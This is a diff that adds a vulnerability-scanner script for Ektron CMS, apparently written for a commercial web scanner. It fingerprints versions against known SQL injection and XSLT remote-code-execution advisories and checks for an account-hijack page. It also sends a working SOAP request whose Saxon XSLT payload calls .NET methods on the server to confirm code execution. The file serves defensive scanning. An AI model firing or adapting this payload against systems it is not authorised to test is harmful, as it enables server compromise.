@@ -1,0 +1,107 @@
+#include helpers.inc;
+#include reporting_helpers.inc;
+#include string_helpers.inc;
+// **************************************************************************************							 
+function alert(uri, vxml, job, matchedText)
+{	
+	var ri = new TReportItem();
+	ri.LoadFromFile(vxml);
+	ri.affects = uri;
+	ri.alertPath = "Scripts/" + vxml; 	
+	ri.setHttpInfo(job);
+    if (matchedText) 
+        ri.Details =  "Installed version: [blue]" + matchedText + "[/blue]";
+	
+	AddReportItem(ri);	
+}	
+// **************************************************************************************
+function checkVersion(dir, path){
+	if (!path.endsWith('/')) path = path + '/';
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'GET';
+	http.uri = path + 'WorkArea/version.xml';
+	
+	http.execute();	
+	
+	if ((!http.wasError && http.response.body.indexOf("<installation>") != -1)){
+        var regex = /<CMS400[^>]+>([\d.]+)<\/CMS400>/gi;
+        var result = [];
+        var e;
+        
+        while (e = regex.exec(http.response.body))
+        if (e && e[1]) 
+        {
+            var found = false;
+            versionStr = e[1];
+            version = parseInt(e[1].replace(".", "").replace(".", "").replace(".", ""));         
+            if (version <= 752) {
+                alert(path, "ektron_cms_ContentRatingGraph_sql_inj.xml", http, versionStr);
+                found = true;
+            }
+                
+            if (version <= 802) {
+                alert(path, "ektron_cms_xslt_rce.xml", http, versionStr);
+                found = true;
+            }
+            
+            if (version <= 850) {
+                alert(path, "ektron_cms_multiple_vulns_sos_12_009.xml", http, versionStr);
+                found = true;
+            }
+            
+            if (found) break; 
+        };
+	}
+}
+// **************************************************************************************
+function checkAccountHijack(dir, path){
+	if (!path.endsWith('/')) path = path + '/';
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'GET';
+	http.uri = path + 'WorkArea/edituserprofile.aspx';
+	
+	http.execute();	
+	
+	if ((!http.wasError && http.response.body.indexOf('<div id="ek_useravatar_label"><a href="/WorkArea/Upload.aspx?') != -1)){
+        alert(path, "EktronCMS_Account_Hijack.xml", http);
+	}
+}
+// **************************************************************************************
+function checkSaxonXSLTParserRemoteCodeExecution(dir, path){
+	if (!path.endsWith('/')) path = path + '/';
+	
+	var http = new THTTPJob();
+	http.url = dir.url;
+	http.verb = 'POST';
+	http.uri = path + 'Workarea/ServerControlWS.asmx';
+	
+	http.request.addHeader("SOAPAction", '"http://www.ektron.com/CMS400/Webservice/ContentBlockEx"', true);
+    http.request.addHeader("Content-Type", "text/xml; charset=utf-8", true);
+	
+	http.request.body = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <ContentBlockEx xmlns="http://www.ektron.com/CMS400/Webservice">      <id>1</id>      <Xslt><![CDATA[ <xsl:transform version="2.0"      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"      xmlns:saxon="http://saxon.sf.net/"><xsl:output method="text"/><xsl:template match="/"><xsl:text>prefix</xsl:text><out xmlns:env="clitype:System.Environment" xmlns:os="clitype:System.OperatingSystem"> <xsl:value-of select="env:Version()"/></out> <xsl:text>postfix</xsl:text></xsl:template></xsl:transform>]]></Xslt>      <over>1</over>      <LangID>1</LangID>    </ContentBlockEx>  </soap:Body></soap:Envelope>';
+	
+	http.execute();	
+	
+	if (!http.wasError){
+		
+		var match = http.response.body.match(/(<ContentBlockExResult>prefix[\d\.]+postfix)/);
+		if (match && match[1]) {		
+			//trace(match[1]);
+        	alert(path, "EktronCMS_XSLT_RCE.xml", http);
+    	}
+	}
+}
+var dir = getCurrentDirectory();
+var alreadyReportedWebApplication = getGlobalValue("detectedAppEktronCMS");
+if (!alreadyReportedWebApplication)
+{
+    setGlobalValue("detectedAppEktronCMS", 1, true);           
+    KBase("EktronCMS web application", "EktronCMS web application was detected in directory [dark][bold]" + dir.fullPath + "[/bold][/dark].");
+}
+checkVersion(dir, dir.fullPath);
+checkAccountHijack(dir, dir.fullPath);
+checkSaxonXSLTParserRemoteCodeExecution(dir, dir.fullPath);
